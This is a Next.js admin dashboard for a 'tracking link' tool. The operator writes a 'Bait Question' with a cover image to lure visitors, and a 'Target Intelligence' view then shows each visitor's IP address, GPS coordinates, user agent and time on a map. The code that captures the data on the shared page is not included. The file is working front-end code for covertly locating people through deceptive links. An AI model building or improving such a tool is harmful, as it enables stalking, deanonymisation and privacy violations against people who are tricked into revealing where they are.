'use client';
import { useState, useEffect } from 'react';
import dynamic from 'next/dynamic';
import { useRouter } from 'next/navigation';
import Sidebar from '@/components/Sidebar';
import { Copy, MapPin, Eye, Clock, TrendingUp, Search, Calendar, Globe, Monitor, Loader2 } from 'lucide-react';

const LocationsMap = dynamic(() => import('@/components/LocationsMap'), {
    ssr: false,
    loading: () => <div className="h-[400px] bg-white/5 animate-pulse rounded-2xl"></div>
});

export default function AdminPage() {
    const router = useRouter();
    const [authChecked, setAuthChecked] = useState(false);
    const [activeTab, setActiveTab] = useState('dashboard');
    const [links, setLinks] = useState<any[]>([]);
    const [loading, setLoading] = useState(false);
    const [title, setTitle] = useState('');
    const [image, setImage] = useState<File | null>(null);
    const [createdLink, setCreatedLink] = useState<any>(null);
    const [selectedLinkId, setSelectedLinkId] = useState<number | null>(null);
    const [locations, setLocations] = useState<any[]>([]);
    const [totalLocations, setTotalLocations] = useState(0);

    // Check authentication on mount
    useEffect(() => {
        checkAuth();
    }, []);

    const checkAuth = async () => {
        try {
            const res = await fetch('/api/auth/session');
            const data = await res.json();

            if (!data.authenticated) {
                router.push('/login');
                return;
            }

            setAuthChecked(true);
            fetchLinks();
            fetchTotalLocations();
        } catch (error) {
            router.push('/login');
        }
    };

    useEffect(() => {
        if (selectedLinkId) fetchLocations(selectedLinkId);
    }, [selectedLinkId]);

    const fetchLinks = async () => {
        const res = await fetch('/api/links');
        const data = await res.json();
        setLinks(data);
    };

    const fetchLocations = async (id: number) => {
        const res = await fetch(`/api/admin/links/${id}/locations`);
        const data = await res.json();
        setLocations(data);
    };

    const fetchTotalLocations = async () => {
        const res = await fetch('/api/locations/count');
        const data = await res.json();
        setTotalLocations(data.count || 0);
    };

    const handleCreate = async (e: React.FormEvent) => {
        e.preventDefault();
        setLoading(true);
        const formData = new FormData();
        formData.append('title', title);
        if (image) formData.append('image', image);

        try {
            const res = await fetch('/api/links', { method: 'POST', body: formData });
            const data = await res.json();
            setCreatedLink(data);
            setTitle('');
            setImage(null);
            fetchLinks();
        } catch (error) {
            alert('Error creating link');
        } finally {
            setLoading(false);
        }
    };

    const copyToClipboard = (uuid: string) => {
        const url = `${window.location.origin}/view/${uuid}`;
        navigator.clipboard.writeText(url);
    };

    // Helper to safely format date
    const formatDate = (dateString: string) => {
        if (!dateString) return 'Just now';
        const date = new Date(dateString);
        return isNaN(date.getTime()) ? 'Recently' : date.toLocaleDateString();
    };

    // Show loading while checking auth
    if (!authChecked) {
        return (
            <div className="min-h-screen bg-black flex items-center justify-center">
                <Loader2 size={32} className="text-blue-500 animate-spin" />
            </div>
        );
    }

    return (
        <div className="min-h-screen bg-black text-white flex">
            <Sidebar activeTab={activeTab} setActiveTab={setActiveTab} />

            <main className="flex-1 ml-64 p-8 relative overflow-hidden">
                <div className="absolute top-0 left-0 w-full h-full overflow-hidden pointer-events-none z-0">
                    <div className="absolute top-[-20%] right-[-10%] w-[800px] h-[800px] bg-blue-600/10 rounded-full blur-[120px]" />
                    <div className="absolute bottom-[-10%] left-[-10%] w-[600px] h-[600px] bg-indigo-600/10 rounded-full blur-[100px]" />
                </div>

                <div className="relative z-10 max-w-7xl mx-auto">
                    <header className="flex justify-between items-center mb-10">
                        <div>
                            <h2 className="text-3xl font-bold">
                                {activeTab === 'dashboard' && 'Overview'}
                                {activeTab === 'create' && 'Create New Link'}
                                {activeTab === 'links' && 'Link Management'}
                            </h2>
                            <p className="text-gray-400 mt-1">Welcome back, Admin.</p>
                        </div>
                    </header>

                    {/* DASHBOARD */}
                    {activeTab === 'dashboard' && (
                        <div className="space-y-8">
                            <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
                                <div className="bg-[#121215] border border-white/10 p-6 rounded-2xl relative overflow-hidden group hover:border-blue-500/30 transition-all">
                                    <div className="flex items-center gap-3 text-blue-400 mb-2">
                                        <TrendingUp size={20} />
                                        <span className="text-sm font-semibold uppercase tracking-wider">Total Active Links</span>
                                    </div>
                                    <p className="text-4xl font-bold">{links.length}</p>
                                </div>
                                <div className="bg-[#121215] border border-white/10 p-6 rounded-2xl relative overflow-hidden group hover:border-purple-500/30 transition-all">
                                    <div className="flex items-center gap-3 text-purple-400 mb-2">
                                        <MapPin size={20} />
                                        <span className="text-sm font-semibold uppercase tracking-wider">Locations Captured</span>
                                    </div>
                                    <p className="text-4xl font-bold">{totalLocations}</p>
                                </div>
                            </div>
                        </div>
                    )}

                    {/* CREATE */}
                    {activeTab === 'create' && (
                        <div className="max-w-2xl mx-auto">
                            <div className="bg-[#121215] border border-white/10 rounded-2xl p-8">
                                <h3 className="text-xl font-bold mb-6 flex items-center gap-2">Configure New Tracker</h3>

                                <form onSubmit={handleCreate} className="space-y-6">
                                    <div>
                                        <label className="block text-sm font-medium text-gray-400 mb-2">Display Title / Bait Question</label>
                                        <input
                                            type="text"
                                            value={title}
                                            onChange={(e) => setTitle(e.target.value)}
                                            required
                                            className="w-full bg-black/50 border border-white/10 rounded-xl p-4 pl-4 focus:ring-2 ring-blue-500/50 outline-none transition-all"
                                            placeholder="e.g. 'You won't believe this view!'"
                                        />
                                    </div>
                                    <div>
                                        <label className="block text-sm font-medium text-gray-400 mb-2">Cover Image</label>
                                        <div className="border-2 border-dashed border-white/10 rounded-xl p-8 text-center hover:bg-white/5 transition-all cursor-pointer relative">
                                            <input
                                                type="file"
                                                onChange={(e) => setImage(e.target.files?.[0] || null)}
                                                className="absolute inset-0 w-full h-full opacity-0 cursor-pointer"
                                            />
                                            <div className="flex flex-col items-center gap-2 text-gray-400">
                                                <div className="bg-white/5 p-3 rounded-full">
                                                    <Eye size={24} />
                                                </div>
                                                <p className="font-medium">{image ? image.name : 'Click or drop image here'}</p>
                                            </div>
                                        </div>
                                    </div>
                                    <button
                                        disabled={loading}
                                        className="w-full bg-blue-600 hover:bg-blue-500 text-white font-bold py-4 rounded-xl transition-all"
                                    >
                                        {loading ? 'Creating Tracker...' : 'Generate Tracking Link'}
                                    </button>
                                </form>

                                {createdLink && (
                                    <div className="mt-8 p-6 bg-green-500/10 border border-green-500/20 rounded-xl">
                                        <div className="flex items-center gap-3 bg-black/60 p-4 rounded-lg cursor-pointer" onClick={() => copyToClipboard(createdLink.uuid)}>
                                            <code className="text-green-300 flex-1 font-mono text-sm truncate">
                                                {window.location.origin}/view/{createdLink.uuid}
                                            </code>
                                            <Copy size={16} className="text-gray-500 hover:text-green-400" />
                                        </div>
                                    </div>
                                )}
                            </div>
                        </div>
                    )}

                    {/* LINKS & ANALYTICS */}
                    {(activeTab === 'links' || activeTab === 'analytics') && (
                        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
                            {links.map((link) => (
                                <div key={link.id} className="bg-[#121215] border border-white/10 rounded-2xl overflow-hidden hover:border-blue-500/30 transition-all flex flex-col">
                                    <div className="p-1 h-32 bg-white/5 relative">
                                        {link.hasImage ? (
                                            <img src={`/api/images/${link.id}`} className="w-full h-full object-cover rounded-t-xl opacity-60" />
                                        ) : (
                                            <div className="w-full h-full flex items-center justify-center text-gray-600">
                                                <Eye size={32} />
                                            </div>
                                        )}
                                        <div className="absolute top-4 right-4 bg-black/60 px-2 py-1 rounded text-xs text-white backdrop-blur">
                                            {formatDate(link.createdAt || link.created_at)}
                                        </div>
                                    </div>
                                    <div className="p-6 flex-1 flex flex-col">
                                        <h3 className="font-bold text-lg mb-2 truncate">{link.title}</h3>
                                        <p className="text-sm text-green-400 mb-6">Status: Monitoring</p>
                                        <div className="mt-auto grid grid-cols-2 gap-3">
                                            <button onClick={() => copyToClipboard(link.uuid)} className="px-4 py-2 bg-white/5 hover:bg-white/10 rounded-lg text-sm text-gray-300 font-medium">Copy URL</button>
                                            <button onClick={() => setSelectedLinkId(link.id)} className="px-4 py-2 bg-blue-600/20 hover:bg-blue-600/30 border border-blue-500/30 text-blue-400 rounded-lg text-sm font-medium">Locations</button>
                                        </div>
                                    </div>
                                </div>
                            ))}
                        </div>
                    )}

                    {/* Modal Overlay */}
                    {selectedLinkId && (
                        <div className="fixed inset-0 bg-black/90 backdrop-blur-sm z-[100] flex items-center justify-center p-4">
                            <div className="bg-[#18181b] w-full max-w-6xl rounded-3xl border border-white/10 overflow-hidden flex flex-col h-[90vh] shadow-2xl">
                                <div className="p-6 border-b border-white/10 flex justify-between items-center bg-[#121215]">
                                    <h2 className="text-2xl font-bold text-white">Target Intelligence</h2>
                                    <button onClick={() => setSelectedLinkId(null)} className="text-2xl text-gray-400 hover:text-white">&times;</button>
                                </div>
                                <div className="flex-1 flex flex-col md:flex-row overflow-hidden">
                                    {/* Map Side */}
                                    <div className="flex-1 border-r border-white/10 relative">
                                        <LocationsMap locations={locations} />
                                    </div>

                                    {/* List/Details Side */}
                                    <div className="w-full md:w-96 bg-[#09090b] overflow-auto">
                                        <div className="p-4">
                                            <h3 className="font-semibold text-gray-400 text-sm uppercase tracking-wider mb-4">Connection Logs</h3>
                                            <div className="space-y-3">
                                                {locations.map((loc) => (
                                                    <div key={loc.id} className="bg-white/5 p-3 rounded-xl border border-white/5 hover:bg-white/10 transition-colors">
                                                        <div className="flex items-center gap-2 mb-2">
                                                            <Globe size={14} className="text-blue-400" />
                                                            <span className="font-mono text-sm text-blue-300">{loc.ipAddress || 'Unknown IP'}</span>
                                                        </div>
                                                        <div className="flex items-center gap-2 mb-2">
                                                            <MapPin size={14} className="text-purple-400" />
                                                            <span className="text-xs text-gray-300">
                                                                {loc.latitude != null && loc.longitude != null
                                                                    ? `${loc.latitude.toFixed(5)}, ${loc.longitude.toFixed(5)}`
                                                                    : 'Location denied'}
                                                            </span>
                                                        </div>
                                                        <div className="flex items-start gap-2 mb-2">
                                                            <Monitor size={14} className="text-gray-500 mt-0.5" />
                                                            <p className="text-[10px] text-gray-500 break-words leading-tight">{loc.userAgent}</p>
                                                        </div>
                                                        <div className="text-[10px] text-gray-600 text-right border-t border-white/5 pt-2 mt-2">
                                                            {new Date(loc.timestamp).toLocaleString()}
                                                        </div>
                                                    </div>
                                                ))}
                                                {locations.length === 0 && (
                                                    <p className="text-sm text-gray-600 text-center py-10">No signals captured yet.</p>
                                                )}
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    )}
                </div>
            </main>
        </div>
    );
}
